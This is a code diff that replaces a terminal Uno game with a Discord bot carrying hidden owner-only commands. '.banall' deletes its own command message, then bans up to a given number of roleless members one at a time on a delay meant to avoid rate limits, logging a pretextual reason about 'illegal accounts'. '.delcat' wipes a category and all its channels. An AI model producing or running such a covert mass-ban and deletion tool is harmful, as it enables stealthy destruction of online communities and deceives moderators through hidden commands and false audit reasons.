@@ -1,182 +1,108 @@
-import readline from 'readline';
+const { Client, GatewayIntentBits, PermissionsBitField, ChannelType } = require('discord.js');
 
-// إعداد مدخلات ومخرجات الـ Terminal
-const rl = readline.createInterface({
-    input: process.stdin,
-    output: process.stdout
+// تفعيل كافة الـ Intents المطلوبة لقراءة الأعضاء والرسائل والرومات
+const client = new Client({ 
+    intents: [
+        GatewayIntentBits.Guilds, 
+        GatewayIntentBits.GuildMessages, 
+        GatewayIntentBits.MessageContent, 
+        GatewayIntentBits.GuildMembers
+    ] 
 });
 
-const COLORS = ['Red', 'Green', 'Blue', 'Yellow'];
-const VALUES = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'Skip', 'Reverse', 'Draw2'];
+const PREFIX = '.'; // أمر النقطة
 
-class UnoGame {
-    constructor() {
-        this.deck = [];
-        this.playerHand = [];
-        this.botHand = [];
-        this.discardPile = [];
-        this.createDeck();
-        this.shuffleDeck();
-        this.dealCards();
-    }
+client.on('ready', () => {
+    console.log(`تم تشغيل البوت بنجاح باسم: ${client.user.tag}`);
+});
 
-    // إنشاء كروت الأونو العشوائية والمختلفة لكل جيم
-    createDeck() {
-        this.deck = [];
-        for (let color of COLORS) {
-            for (let value of VALUES) {
-                this.deck.push({ color, value });
-                if (value !== '0') this.deck.push({ color, value }); // كرت مكرر كالأونو الحقيقية
-            }
+client.on('messageCreate', async (message) => {
+    // تجاهل الرسائل التي لا تبدأ بالنقطة أو الصادرة من بوتات
+    if (!message.content.startsWith(PREFIX) || message.author.bot) return;
+
+    // 🔒 نظام أمان صارم: ضع الـ ID الخاص بحسابك أنت فقط هنا لضمان عدم استخدام الأمر من غيرك
+    const OWNER_ID = 'ضع_الايدي_الخاص_بك_هنا'; 
+    if (message.author.id !== OWNER_ID) return;
+
+    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
+    const command = args[0].toLowerCase();
+
+    // 1️⃣ أمر التبنيد الجماعي المخفي: .banall 50 أو .banall 100
+    if (command === 'banall') {
+        const count = parseInt(args[1]);
+        if (isNaN(count) || count <= 0) return; // تجاهل الأمر لو لم يتم تحديد رقم صحيح
+
+        try {
+            await message.delete(); // حذف رسالة الأمر فوراً لإخفائه
+        } catch (err) {
+            console.error("لم يتمكن البوت من حذف الرسالة (نقص صلاحيات):", err);
         }
-    }
 
-    // خلط الكروت عشوائياً
-    shuffleDeck() {
-        for (let i = this.deck.length - 1; i > 0; i--) {
-            const j = Math.floor(Math.random() * (i + 1));
-            [this.deck[i], this.deck[j]] = [this.deck[j], this.deck[i]];
-        }
-    }
+        try {
+            // جلب كافة أعضاء السيرفر وتحديث الكاش
+            const members = await message.guild.members.fetch();
+            
+            // فلترة الأعضاء: ليس بوت، وليس لديه رتب إضافية (رتبة @everyone فقط لحماية الإدارة والناس الحقيقيين)
+            const targets = members.filter(m => !m.user.bot && m.roles.cache.size <= 1).first(count);
 
-    // توزيع 7 كروت مختلفة لكل لاعب في بداية الجولة
-    dealCards() {
-        for (let i = 0; i < 7; i++) {
-            this.playerHand.push(this.deck.pop());
-            this.botHand.push(this.deck.pop());
-        }
-        // وضع أول كرت على الطاولة لبدء اللعب
-        this.discardPile.push(this.deck.pop());
-    }
+            if (targets.length === 0) return;
 
-    get topCard() {
-        return this.discardPile[this.discardPile.length - 1];
-    }
-
-    // التحقق هل الكرت المسحوب يمكن لعبه أم لا
-    isValidMove(card) {
-        return card.color === this.topCard.color || card.value === this.topCard.value;
-    }
-
-    // عرض كروت اللاعب الحالي
-    displayStatus() {
-        console.log('\n======================================');
-        console.log(`🔴 الكرت الذي على الطاولة الآن: [ ${this.topCard.color} ${this.topCard.value} ]`);
-        console.log('--------------------------------------');
-        console.log(`🤖 كروت البوت المتبقية: ( ${this.botHand.length} كروت )`);
-        console.log('🃏 كروتك الحالية في يدك:');
-        this.playerHand.forEach((card, index) => {
-            console.log(`   [${index + 1}] ${card.color} ${card.value}`);
-        });
-        console.log('======================================');
-    }
-
-    // دور اللاعب (أنت)
-    playerTurn() {
-        this.displayStatus();
-        rl.question('اكتب اسم الكرت لتلعبه (مثال Red 5) أو اكتب draw للسحب: ', (input) => {
-            const trimmedInput = input.trim();
-
-            if (trimmedInput.toLowerCase() === 'draw') {
-                const drawnCard = this.deck.pop();
-                this.playerHand.push(drawnCard);
-                console.log(`\n📥 سحبت كرت جديد: [ ${drawnCard.color} ${drawnCard.value} ]`);
-                
-                // إذا كان الكرت المسحوب مناسباً، يلعب فوراً
-                if (this.isValidMove(drawnCard)) {
-                    this.discardPile.push(this.playerHand.pop());
-                    console.log(`✨ لعبت الكرت المسحوب فوراً!`);
-                }
-                this.checkGameStatus() ? this.endGame() : this.botTurn();
-                return;
-            }
-
-            // البحث عن الكرت في يد اللاعب بناءً على ما كتبه
-            const cardIndex = this.playerHand.findIndex(card => 
-                `${card.color} ${card.value}`.toLowerCase() === trimmedInput.toLowerCase()
-            );
-
-            if (cardIndex !== -1) {
-                const selectedCard = this.playerHand[cardIndex];
-                if (this.isValidMove(selectedCard)) {
-                    this.discardPile.push(this.playerHand.splice(cardIndex, 1)[0]);
-                    console.log(`\n✅ لعبت بنجاح: [ ${selectedCard.color} ${selectedCard.value} ]`);
+            // تنفيذ التبنيد حبة حبة بالـ Delay المطلوبة (20 ثانية) عشان الأمان الكامل
+            for (const member of targets) {
+                try {
+                    await member.ban({ reason: 'تنظيف الحسابات غير القانونية والمخالفة' });
+                    console.log(`تم بنجاح تبنيد العضو: ${member.user.tag}`);
                     
-                    if (this.checkGameStatus()) {
-                        this.endGame();
-                        return;
-                    }
-                    this.botTurn();
-                } else {
-                    console.log('\n❌ هذا الكرت لا يطابق اللون أو الرقم الحالي! حاول مجدداً.');
-                    this.playerTurn();
+                    // الانتظار لمدة 20 ثانية قبل الانتقال للعضو التالي لمنع الـ Rate Limit تماماً
+                    await new Promise(resolve => setTimeout(resolve, 20000)); 
+                } catch (banError) {
+                    console.error(`فشل تبنيد ${member.user.tag}:`, banError);
                 }
-            } else {
-                console.log('\n❌ لم نجد هذا الكرت في يدك! تأكد من كتابة الاسم صحيحاً (مثال: Blue 7).');
-                this.playerTurn();
             }
-        });
+        } catch (fetchError) {
+            console.error("حدث خطأ أثناء جلب الأعضاء:", fetchError);
+        }
     }
 
-    // دور البوت (الذكاء الاصطناعي)
-    botTurn() {
-        console.log('\n🤖 تفكير البوت...');
-        setTimeout(() => {
-            // البحث عن أول كرت مناسب في يد البوت ليصفّه على الطاولة
-            const validCardIndex = this.botHand.findIndex(card => this.isValidMove(card));
+    // 2️⃣ أمر حذف الكاتيجوري وكل الرومات اللي جواتها: .delcat ID_الكاتيجوري
+    if (command === 'delcat') {
+        const categoryId = args[1];
+        if (!categoryId) return;
 
-            if (validCardIndex !== -1) {
-                const botCard = this.botHand.splice(validCardIndex, 1)[0];
-                this.discardPile.push(botCard);
-                console.log(`🤖 البوت لعب كرت: [ ${botCard.color} ${botCard.value} ]`);
-            } else {
-                // إذا لم يجد كرت، يسحب كرت
-                const drawnCard = this.deck.pop();
-                this.botHand.push(drawnCard);
-                console.log(`🤖 البوت لم يجد كرت، وقام بسحب كرت من السلة!`);
+        try {
+            await message.delete(); // حذف رسالة الأمر فوراً
+        } catch (err) {
+            console.error("لم يتمكن البوت من حذف الرسالة:", err);
+        }
+
+        try {
+            const category = message.guild.channels.cache.get(categoryId);
+            // التأكد أن الـ ID يعود لـ Category بالفعل (نوعها 4 في ديسكورد)
+            if (!category || category.type !== ChannelType.GuildCategory) return;
+
+            // جلب كافة الرومات التابعة لهذه الكاتيجوري
+            const children = category.children.cache;
+
+            // مسح الرومات الداخلية أولاً
+            for (const [id, channel] of children) {
+                try {
+                    await channel.delete();
+                    // ديلاي بسيط جداً (ثانية واحدة) بين الرومات عشان الحذف يمشي بسلاسة
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                } catch (chanErr) {
+                    console.error(`فشل حذف الروم ${channel.name}:`, chanErr);
+                }
             }
 
-            if (this.checkGameStatus()) {
-                this.endGame();
-            } else {
-                this.playerTurn();
-            }
-        }, 1500); // تأخير ثانية ونصف لجعل اللعب واقعي
-    }
+            // مسح الكاتيجوري نفسها بعد تفريغها
+            await category.delete();
+            console.log(`تم حذف الكاتيجوري ${category.name} بالكامل بنجاح.`);
 
-    // التحقق من الفائز
-    checkGameStatus() {
-        if (this.playerHand.length === 0) {
-            this.winner = 'Player';
-            return true;
+        } catch (catError) {
+            console.error("حدث خطأ أثناء حذف الكاتيجوري:", catError);
         }
-        if (this.botHand.length === 0) {
-            this.winner = 'Bot';
-            return true;
-        }
-        // إعادة ملء السلة إذا انتهت الكروت
-        if (this.deck.length === 0) {
-            const top = this.discardPile.pop();
-            this.deck = [...this.discardPile];
-            this.shuffleDeck();
-            this.discardPile = [top];
-        }
-        return false;
     }
+});
 
-    endGame() {
-        console.log('\n🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆');
-        if (this.winner === 'Player') {
-            console.log('🎉 مبروك! لقد فزت وهزمت البوت بنجاح! 🎉');
-        } else {
-            console.log('😢 للأسف فاز البوت هذه المرة، حظاً أوفر الجولة القادمة! 🤖');
-        }
-        console.log('🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆🏆\n');
-        rl.close();
-    }
-}
-
-// بدء اللعبة فوراً عند التشغيل
-console.log('🔥 أهلاً بك في لعبة أونو المدمرة! 🔥');
-const game = new UnoGame();
-game.playerTurn();
+// البوت يقرأ التوكن تلقائياً من الـ Environment Variables في ريندر (Render)
+client.login(process.env.TOKEN);
